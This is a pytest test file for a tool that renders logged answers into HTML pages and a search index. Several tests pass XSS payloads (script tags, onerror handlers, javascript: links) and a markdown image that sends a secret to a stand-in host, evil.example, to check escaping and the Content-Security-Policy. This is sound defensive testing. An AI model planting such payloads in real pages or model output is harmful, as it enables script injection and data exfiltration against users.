import json
import re
from pathlib import Path

from mrai import render
from mrai.logbook import Logbook
from mrai.settings import workspace_key


def _home(tmp_path: Path) -> Path:
    return tmp_path / "mrai-home"  # MRAI_HOME, set by conftest


def _ws(tmp_path: Path, name: str = "repo-1234abcd") -> Path:
    d = _home(tmp_path) / "workspaces" / name
    d.mkdir(parents=True, exist_ok=True)
    return d


def _index(tmp_path: Path) -> list[dict]:
    text = (_home(tmp_path) / "site" / "index.js").read_text()
    return json.loads(text.removeprefix("window.MRAI_INDEX = ").rstrip().removesuffix(";"))


def _csp(html: str) -> str:
    return html.split('http-equiv="Content-Security-Policy" content="', 1)[1].split('"', 1)[0]


def test_write_page_lands_in_the_shared_site(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    ws = _ws(tmp_path)
    path = render.write_page(ws, "hello world", "# Hi\n\nSee `x`.")
    site = _home(tmp_path) / "site"
    assert path == site / ws.name / "hello-world.html"
    assert "<h1>Hi</h1>" in path.read_text()
    for name in render.ASSETS:
        assert (site / name).is_file()
    assert not (tmp_path / ".mrai").exists()


def test_page_is_thin(tmp_path):
    md = "\n\n".join(f"para {i}" for i in range(5))
    html = render.write_page(_ws(tmp_path), "t", md).read_text()
    assert "<style>" not in html
    assert not re.search(r"<script>(?!\s*</script>)", html), "no inline script"
    assert '<script src="../index.js" defer></script>' in html
    assert 'id="tpl-item"' in html and 'id="mrai-nav"' in html


def test_render_escapes_html_from_the_answer(tmp_path):
    hostile = "<script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))"
    html = render.write_page(_ws(tmp_path), "t", hostile).read_text()
    body = html.split("<article>", 1)[1].split("</article>", 1)[0]
    assert "<script>alert" not in body and "&lt;script&gt;" in body
    assert "<img" not in body
    assert 'href="javascript:' not in body


def test_title_is_escaped(tmp_path):
    html = render.write_page(_ws(tmp_path), "</title><script>x", "x").read_text()
    assert "<title>&lt;/title&gt;&lt;script&gt;x</title>" in html


def test_csp_forbids_inline_eval_and_remote_images(tmp_path):
    html = render.write_page(_ws(tmp_path), "t", "![](https://evil.example/?d=secret)").read_text()
    csp = _csp(html)
    assert "'unsafe-inline'" not in csp and "'unsafe-eval'" not in csp
    assert "img-src data:" in csp
    assert html.count('integrity="sha512-') == 3


def test_assets_are_cache_busted_by_content(tmp_path):
    html = render.write_page(_ws(tmp_path), "t", "x").read_text()
    assert f"app.js?v={render.asset_version()}" in html


def test_host_path_maps_container_state_dir_to_host(tmp_path, monkeypatch):
    state = tmp_path / "state"
    inside = state / "renders" / "x.html"
    assert render.host_path(inside, state) == inside
    monkeypatch.setenv("MRAI_HOST_DIR", "/home/u/.mrai/workspaces/repo-1234abcd")
    assert render.host_path(inside, state) == Path(
        "/home/u/.mrai/workspaces/repo-1234abcd/renders/x.html"
    )


def test_host_path_maps_container_home_to_host(tmp_path, monkeypatch):
    inside = _home(tmp_path) / "site" / "ws" / "x.html"
    monkeypatch.setenv("MRAI_HOST_HOME", "/home/u/.mrai")
    assert render.host_path(inside) == Path("/home/u/.mrai/site/ws/x.html")


def test_index_spans_all_workspaces(tmp_path):
    Logbook(_ws(tmp_path, "api-1111aaaa")).append("alpha", "Alpha", "q1", "slugify lives here")
    Logbook(_ws(tmp_path, "web-2222bbbb")).append("beta", "Beta", "q2", "router fallback")
    render.write_index()
    idx = _index(tmp_path)
    assert {(e["ws"], e["topic"]) for e in idx} == {
        ("api-1111aaaa", "alpha"),
        ("web-2222bbbb", "beta"),
    }


def test_index_includes_a_current_dir_outside_workspaces(tmp_path):
    Logbook(_ws(tmp_path)).append("a", "A", "q", "x")
    custom = tmp_path / "custom-state"
    Logbook(custom).append("b", "B", "q", "y")
    render.write_index(custom)
    assert {e["ws"] for e in _index(tmp_path)} == {"repo-1234abcd", "custom-state"}


def test_new_answer_does_not_rewrite_other_pages(tmp_path):
    a, b = _ws(tmp_path, "a-1"), _ws(tmp_path, "b-2")
    Logbook(a).append("alpha", "Alpha", "q", "a")
    page = render.write_page(a, "alpha", "a")
    before = page.read_text()
    Logbook(b).append("beta", "Beta", "q", "b")
    render.write_page(b, "beta", "b")
    render.write_index(b)
    assert page.read_text() == before
    assert {e["topic"] for e in _index(tmp_path)} == {"alpha", "beta"}


def test_index_data_is_inert_and_preview_html_escaped(tmp_path):
    hostile = "</script><img src=x onerror=alert(1)> [x](javascript:alert(1)) `code`"
    Logbook(_ws(tmp_path)).append("t", "T", "q", hostile)
    render.write_index()
    raw = (_home(tmp_path) / "site" / "index.js").read_text()
    assert "<" not in raw
    [entry] = [e for e in _index(tmp_path) if "onerror" in e["text"]]
    assert "<img" not in entry["html"] and "&lt;img" in entry["html"]
    assert 'href="javascript:' not in entry["html"]
    assert "<code>code</code>" in entry["html"]


def test_index_excludes_memory_file(tmp_path):
    ws = _ws(tmp_path)
    lb = Logbook(ws)
    lb.append("t", "T", "q", "body")
    lb.remember(ws / "memories.md", "t", "T")
    render.write_index()
    assert {e["topic"] for e in _index(tmp_path)} == {"t"}


def test_index_carries_time_workspace_and_file(tmp_path):
    lb = Logbook(tmp_path)
    (tmp_path / "old.md").write_text("# Old\n\n## Legacy\n\n**Q:** q\n\nno stamp\n")
    lb.record_workspace(Path("/repo/legacy"))
    lb.append("new", "New", "q", "## Inner\n\nstamped", cwd=Path("/repo/now"))
    idx = lb.search_index()
    assert [e["topic"] for e in idx] == ["new", "old"]
    assert {e["cwd"] for e in idx if e["topic"] == "new"} == {"/repo/now"}
    assert all("mrai ts=" not in e["text"] for e in idx)
    [legacy] = [e for e in idx if e["topic"] == "old"]
    assert legacy["cwd"] == "/repo/legacy" and legacy["ts"] and legacy["file"].endswith("old.md")


def test_workspace_recorded_only_for_the_matching_state_dir(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    shared = tmp_path / "shared"
    render.record_workspace(shared, repo)
    assert not (shared / "workspace").exists()
    own = tmp_path / workspace_key(repo)
    render.record_workspace(own, repo)
    assert (own / "workspace").read_text().strip() == str(repo)


def test_reindex_rebuilds_every_workspace_with_latest_answer(tmp_path):
    a, b = _ws(tmp_path, "a-1"), _ws(tmp_path, "b-2")
    Logbook(a).append("t", "T", "first q", "old answer")
    Logbook(a).append("t", "T2", "second q", "## Heading\n\nnew answer")
    Logbook(b).append("u", "U", "q", "other workspace")
    pages = render.reindex(a)
    site = _home(tmp_path) / "site"
    assert sorted(pages) == [site / "a-1" / "t.html", site / "b-2" / "u.html"]
    body = (site / "a-1" / "t.html").read_text().split("<article>", 1)[1]
    assert "new answer" in body and "old answer" not in body
    assert {e["ws"] for e in _index(tmp_path)} == {"a-1", "b-2"}


def test_run_stats_render_on_the_page_but_stay_out_of_search(tmp_path):
    ws = _ws(tmp_path)
    answer = "the answer\n\n<!-- mrai stats -->\n\n---\n\n| Run stats | |\n| --- | --- |\n| Cost | $1 |\n"
    Logbook(ws).append("t", "T", "q", answer)
    html = render.write_page(ws, "t", answer).read_text()
    assert "<th>Run stats</th>" in html and "mrai stats" not in html
    render.write_index()
    assert all("Run stats" not in e["text"] for e in _index(tmp_path))


def test_one_index_entry_per_logged_answer_despite_subheadings(tmp_path):
    lb = Logbook(_ws(tmp_path))
    lb.append("t", "First", "q1", "## Roles\n\nx\n\n## Caveats\n\ny")
    lb.append("t", "Second", "q2", "## Short answer\n\nz")
    idx = lb.search_index()
    assert sorted(e["heading"] for e in idx) == ["First", "Second"]
    [first] = [e for e in idx if e["heading"] == "First"]
    assert "## Roles" in first["text"] and "## Caveats" in first["text"]


def test_unstructured_topic_file_is_a_single_entry(tmp_path):
    ws = _ws(tmp_path)
    (ws / "notes.md").write_text("# Notes\n\n## a\n\none\n\n## b\n\ntwo\n")
    [entry] = Logbook(ws).search_index()
    assert "one" in entry["text"] and "two" in entry["text"]
